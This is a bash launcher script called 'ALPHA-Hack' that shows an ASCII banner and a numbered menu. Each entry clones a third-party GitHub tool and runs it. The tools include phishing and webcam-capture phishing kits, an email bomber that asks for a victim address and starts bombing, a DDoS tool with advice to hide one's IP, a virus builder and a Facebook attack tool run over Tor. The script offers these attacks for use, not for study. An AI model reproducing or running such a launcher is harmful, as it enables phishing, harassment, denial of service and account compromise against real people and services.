clear
mkdir Tools
clear 
echo -e '\033[31;40;1m 
$$$$$$\  $$\       $$$$$$$\  $$\   $$\  $$$$$$\          $$\   $$\                     $$\       
$$  __$$\ $$ |      $$  __$$\ $$ |  $$ |$$  __$$\         $$ |  $$ |                    $$ |      
$$ /  $$ |$$ |      $$ |  $$ |$$ |  $$ |$$ /  $$ |        $$ |  $$ | $$$$$$\   $$$$$$$\ $$ |  $$\ 
$$$$$$$$ |$$ |      $$$$$$$  |$$$$$$$$ |$$$$$$$$ |$$$$$$\ $$$$$$$$ | \____$$\ $$  _____|$$ | $$  |
$$  __$$ |$$ |      $$  ____/ $$  __$$ |$$  __$$ |\______|$$  __$$ | $$$$$$$ |$$ /      $$$$$$  / 
$$ |  $$ |$$ |      $$ |      $$ |  $$ |$$ |  $$ |        $$ |  $$ |$$  __$$ |$$ |      $$  _$$<  
$$ |  $$ |$$$$$$$$\ $$ |      $$ |  $$ |$$ |  $$ |        $$ |  $$ |\$$$$$$$ |\$$$$$$$\ $$ | \$$\ 
\__|  \__|\________|\__|      \__|  \__|\__|  \__|        \__|  \__| \_______| \_______|\__|  \__| v1
  Coded by Hansa_Themiya
  github: https://github.com/hansathemiya
\033[33;1mVersion:\033[0m 4            \033[33;4mCTRL+C:\033[0m exit          \033[33;4mAuthor:\033[0m hansathemiya

\e[37m[1]\e[36m Requests & Updates        \e[37m[2]\e[36m Phishing Tool             
\e[37m[3]\e[36m WebCam Hack                   \e[37m[4]\e[36m Subscan           
\e[37m[5]\e[36m Gmail Bomber          \e[37m[6]\e[36m DDOS Attack           
\e[37m[7]\e[36m How to use?           \e[37m[8]\e[36m Uninstall downloaded programs     
\e[37m[9]\e[36m IP Info                   \e[37m[10]\e[36m Dorks Eye
\e[37m[11]\e[36m HackerPro                    \e[37m[12]\e[36m RED_HAWK
\e[37m[13]\e[36m VirusCrafter                 \e[37m[14]\e[36m Info-Site
\e[37m[15]\e[36m BadMod                   \e[37m[16]\e[36m Facebash
\e[37m[17]\e[36m DARKARMY                     \e[37m[18]\e[36m AUTO-IP-CHANGER

'


#Option Selection


read -p "Transaction number: " option
if [[ $option == 1 || $option == 01 ]]; then
clear

echo -e "\033[47;31;5m Installing updates and requests...\033[0m"
sleep 5
pkg install git -y
pkg install python python3 -y
pkg install pip pip3 -y
pkg install curl -y
apt update
apt upgrade -y
clear
echo -e "\033[47;3;35m Update complete...\033[0m"
sleep 3
bash alpha-hack.sh

elif [[ $option == 2 || $option == 02 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
git clone https://github.com/htr-tech/zphisher
cd zphisher
bash zphisher.sh

elif [[ $option == 3 || $option == 03 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
git clone https://github.com/techchipnet/CamPhish
cd CamPhish
bash camphish.sh

elif [[ $option == 4 || $option == 04 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
git clone https://github.com/zidansec/subscan
cd subscan
read -p "Enter a domain e.g. (example.com): " domain
./subscan $domain

elif [[ $option == 5 || $option == 05 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
git clone https://github.com/juzeon/fast-mail-bomber.git
cd fast-mail-bomber/
mv config.example.php config.php
php index.php update-providers
rm -rf data/nodes.json data/dead_providers.json
echo -e "\033[47;3;35m This installation may take a long time\033[0m"
echo -e "\033[47;3;35m Press Ctrl+C to stop\033[0m"
sleep 4
php index.php update-nodes
php index.php refine-nodes
echo "-------------------------"
read -p "Enter an email address to bomb: " email
echo "-------------------------"
php index.php start-bombing $email

elif [[ $option == 6 || $option == 06 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
git clone https://github.com/palahsu/DDoS-Ripper.git
cd DDoS-Ripper
python3 DRipper.py
echo ""
echo -e "\033[47;3;35m Hide your IP before using\033[0m"

elif [[ $option == 7 || $option == 07 ]]; then
clear
echo "YouTube Video: https://www.youtube.com/watch?v=zgdq6ErscqY"
python3 -m webbrowser https://www.youtube.com/watch?v=zgdq6ErscqY
sleep 10
echo "Wait 10 seconds"
bash alpha-hack.sh


elif [[ $option == 8 || $option == 08 ]]; then
clear
echo -e "\033[47;3;35m UNINSTALLING DOWNLOADED PROGRAMS...\033[0m"
sleep 3 
rm -rf Tools

bash alpha-hack.sh

elif [[ $option == 9 || $option == 09 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
apt update
apt install git curl
git clone https://github.com/htr-tech/track-ip.git
cd track-ip
bash trackip

elif [[ $option == 10 || $option == 010 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
git clone https://github.com/BullsEye0/dorks-eye.git
cd dorks-eye
pip install -r requirements.txt
python3 dorks-eye.py

elif [[ $option == 11 || $option == 011 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
apt update && apt upgrade && apt install git && apt install python2
git clone https://github.com/jaykali/hackerpro.git
cd hackerpro
sudo bash install.sh
python2 hackerpro.py

elif [[ $option == 12 || $option == 012 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
git clone https://github.com/Tuhinshubhra/RED_HAWK
cd RED_HAWK
php rhawk.php

elif [[ $option == 13 || $option == 013 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
git clone https://github.com/Devil-Tigers/TigerVirus
apt update
apt upgrade -y
pkg install git -y
cd TigerVirus
bash app.sh

elif [[ $option == 14 || $option == 014 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
pkg install curl -y
upgrade -y
pkg install git -y
git clone https://github.com/king-hacking/info-site.git
cd info-site
bash info.sh

elif [[ $option == 15 || $option == 015 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
sudo apt-get update
sudo apt-get install php
sudo apt-get install php-curl
git clone https://github.com/MrSqar-Ye/BadMod.git
cd BadMod
chmod u+x INSTALL
chmod u+x BadMod.php
sudo php BadMod.php

elif [[ $option == 16 || $option == 016 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
git clone https://github.com/fu8uk1/facebash
cd facebash
bash install.sh
chmod +x facebash.sh
tor
sudo ./facebash.sh

elif [[ $option == 17 || $option == 017 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
pkg install git
pkg install python2
apt install git
apt install python2
git clone https://github.com/D4RK-4RMY/DARKARMY
cd DARKARMY
chmod +x darkarmy.py
python2 darkarmy.py

elif [[ $option == 18 || $option == 018 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
echo -e "\033[47;3;35m This tool will require you to be (ROOT)\033[0m"
sleep 3
cd Tools
sudo apt-get install tor
pip3 install requests
git clone https://github.com/FDX100/Auto_Tor_IP_changer.git
cd Auto_Tor_IP_changer
echo -e "\033[47;3;35m go to your browser / change the proxy (sock proxy) në 127.0.0.1:9050\033[0m"
sleep 8
python3 install.py
aut

else   
  clear
        echo -e '\033[36;40;1m You entered the wrong code'	
  sleep 1
  clear 
  bash alpha-hack.sh
fi
